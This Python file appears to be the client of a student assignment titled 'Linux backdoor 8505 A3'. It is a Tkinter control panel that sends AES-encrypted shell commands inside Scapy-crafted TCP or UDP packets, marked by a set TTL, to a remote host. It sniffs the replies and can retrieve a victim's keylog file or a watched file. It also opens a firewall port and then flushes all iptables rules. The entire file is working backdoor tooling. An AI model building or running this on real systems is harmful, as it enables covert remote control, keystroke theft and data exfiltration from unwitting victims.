import argparse
import logging
import binascii
from scapy.all import *
from binascii import hexlify, unhexlify
import setproctitle
import sys
from tkinter import *
from tkinter import ttk
import tkinter as tk
import multiprocessing
from multiprocessing import Process
import crypto
import time
import subprocess


def main():
    print("Client start")
    root = Tk()
    root.geometry("1000x600")
    root.title("Linux backdoor 8505 A3")
    root.configure(bg="gray")
    
    global destinationip
    global processtitle
    global command
    global sourceip
    global results
    global protocol
    global watchfile
    global resultchange
    global filechange
    global note
    destinationip = StringVar(value='10.0.0.33')
    processtitle = StringVar(value='title')
    command = StringVar(value='ls')
    sourceip = StringVar(value='10.0.0.123')
    results = StringVar()
    protocol = StringVar()   
    watchfile = StringVar()
    resultchange=StringVar()
    filechange = StringVar()
    note = StringVar()
    #resultchange.set("Change will be showed here:")
    filechange.set("Check console or Directory for result")
    results.set("Result here")
    note.set("keylog.txt download keystrokes.other file name for file monitoring")
    #GUI interface
    lDestIP = Label(root, text = "Destination IP", width = 20,bg="black", fg="white")
    lDestIP.grid(column = 0, row = 3)
    eDestIP = Entry(root, textvariable = destinationip,fg="black", bg='white', width = 30)
    eDestIP.grid(column = 1, row = 3, padx = 12, pady = 10, ipady = 3)

    lSourceIP = Label(root, text = "Source IP", fg="white",bg="black")
    lSourceIP.grid(column = 0, row = 4)
    eSourceIP = Entry(root, textvariable = sourceip,fg="black", bg='white', width = 30)
    eSourceIP.grid(column = 1, row = 4, pady = 8, ipady = 3)

    lProcessTitle = Label(root, text = "Process Title", fg="white",bg="black")
    lProcessTitle.grid(column = 0, row = 6)
    mProcessTitle = Entry(root, textvariable = processtitle,fg="black", bg='white', width = 30)
    mProcessTitle.grid(column = 1, row = 6, pady = 8, ipady = 3)

    lCommand = Label(root, text = "Commands to send", fg="white",bg="black")
    lCommand.grid(column = 0, row = 8, padx = 8)
    eCommand = Entry(root, textvariable = command, fg="black",bg='white', width = 30)
    eCommand.grid(column = 1, row = 8, pady = 8, ipady = 3)

    lProtocol = Label(root, text = "Protocol(UDP or TCP)", fg="white",bg="black")
    lProtocol.grid(column = 0, row = 10, padx = 8)
    eProtocol = Entry(root, textvariable = protocol, fg="black",bg='white', width = 30)
    eProtocol.grid(column = 1, row = 10, pady = 8, ipady = 3)
    
    b = tk.Button(root, text="Send Command", command=parse, width = 30, background = "red", activebackground = "blue", activeforeground = "green")
    b.grid(column = 1, row = 14, pady = 2, ipady = 2, columnspan = 1)
    
    #watch file
    lableWatch = Label(root, text = "Watch File Name", fg="white",bg="black")
    lableWatch.grid(column = 10, row = 3, padx = 8)
    eWatchEntry = Entry(root, textvariable = watchfile, fg="black",bg='white', width = 30)
    eWatchEntry.grid(column = 13, row = 3, pady = 8, ipady = 3)
    

    
    #watch result
    lresultWatch = tk.Label(root, textvariable = resultchange, fg="white",bg="black")
    lresultWatch.grid(column = 13, row = 5, padx = 8)
    
    lfileChange = tk.Label(root, textvariable = filechange, fg="white",bg="black")
    lfileChange.grid(column = 13, row = 6, padx = 8)
    
    lnote = tk.Label(root, textvariable = note, fg="white",bg="black")
    lnote.grid(column = 13, row = 7, padx = 8)
    #watch button
    watchButton = tk.Button(root, text="Send", command=parsewatch, width = 30, background = "red", activebackground = "blue", activeforeground = "green")
    watchButton.grid(column = 13, row = 4, pady = 2, ipady = 2, columnspan = 1)
    #Show command results

    lResults = tk.Label(root, textvariable = results, fg = "black")
    lResults.grid(column = 1, row = 15, pady = 3, ipady = 2, columnspan = 1)
        
    
    root.mainloop()

def sendData(dstIP,data,title,srcIP):
    global protocol
    ttlKey = 111
    startAES = 0
    key = 8
    info = title+ "\"" + data
    print(info)
    
    encrypted_msg = b''
    print("AES encryption")
    
    encrypted_msg = crypto.aesEncrypt(info.encode("utf8"))
    print("encrypted_msg: "+str(encrypted_msg))
    decryptedText = crypto.aesDecrypt(encrypted_msg)
    print("decryptedText: "+ str(decryptedText))
    
    #pkt = IP(src=srcIP,dst=dstIP)/UDP(dport=8000,sport=8505)/encrypted_msg
    proto = protocol.get().lower()
    print(proto)
    if proto =="tcp":
        pkt = IP(src=srcIP,dst=dstIP,ttl=ttlKey)/TCP(dport=8000,sport=8505)/encrypted_msg
        send(pkt,verbose=0)
        print("sent packet: "+ str(pkt))
    if proto =="udp":
        print("udp")
        pkt = IP(src=srcIP,dst=dstIP,ttl=ttlKey)/UDP(dport=8000,sport=8505)/encrypted_msg
        send(pkt,verbose=0)
        print("sent packet: "+ str(pkt))

#start watch process
def parsewatch():
    p = Process(target=watchs,args="")
    if p.is_alive():
        p.terminate()
    p.start()
    
def watchs():
    print("Monitoring")
    proto = protocol.get().lower()
    watchFile = watchfile.get()
    destIP = destinationip.get()
    processTitle = processtitle.get()
    sourceIP = sourceip.get()
    sendDataWatch(destIP,watchFile,processTitle,sourceIP)
    if proto =="udp":
        sniff(filter="udp and dst port 6666 and src port 6666", prn=readWatch, count=1)
    if proto =="tcp":
        sniff(filter="tcp and dst port 6666 and src port 6666", prn=readWatch, count=1)
    
def sendDataWatch(dstIP,data,title,sourceIP):
    proto = protocol.get().lower()
    info= title + "\"" + data
    ciphertest = hexlify(info.encode("utf-8"))
    aesCiphertest = crypto.aesEncrypt(ciphertest)
    if proto =="tcp":
        pkt = IP(src=sourceIP,dst=dstIP)/TCP(dport=9000,sport=9505)/aesCiphertest
        send(pkt,verbose=0)
        print("sent packet: "+ str(pkt))
    if proto =="udp":
        pkt = IP(src=sourceIP,dst=dstIP)/UDP(dport=9000,sport=9505)/aesCiphertest
        send(pkt,verbose=0)
        print("sent packet: "+ str(pkt))

    
def knocker():
    command = "iptables -I INPUT -p tcp --dport " + str(6666) + " -j ACCEPT"
    subprocess.Popen(command, stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
    
def readWatch(pkt):
    global resultn
    print("Read from watchdog")
    watchFile = watchfile.get()
    if ARP not in pkt:
        knocker()
        data = pkt["Raw"].load
        decryptedMessage = crypto.aesDecrypt(data)
        resultn = decryptedMessage
        #message = binascii.unhexlify(decryptedMessage)
        #decodd = message.decode("utf-8")
        print("=========================================")
        print (decryptedMessage)
        print("=========================================")
        f = open(watchFile,'w')
        f.write(decryptedMessage)
        f.close()
        
        
        time.sleep(10)
        close_command = "iptables -F"
        subprocess.Popen(close_command, stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
        
    
    
    return

def parse():
    global protocol
    global destIP
    destIP = destinationip.get()
    print (destIP)
    processTitle = processtitle.get()
    newCommand = command.get()
    sourceIP = sourceip.get()

    
    sendData(destIP, newCommand, processTitle, sourceIP)
    print(destIP)
    if command == ("quit"):
        exit()
    proto = protocol.get().lower()
    if proto =="udp":
        
        sniff(filter="udp and dst port 8505 and src port 8000",prn=readPacket, count=1)
    if proto =="tcp":
        sniff(filter="tcp and dst port 8505 and src port 8000", prn=readPacket, count=1)
        


def readPacket(pkt):
   
    if ARP not in pkt:
        data = pkt["Raw"].load
        decryptedMessage = crypto.aesDecrypt(data)
        message = binascii.unhexlify(decryptedMessage)
        decoded = message.decode("utf-8")   
        print (decoded)
    results.set(decoded)
    
    return

if __name__ == '__main__':

    try:
        main()
    except KeyboardInterrupt:
        print ('Exiting..')
    
    
    
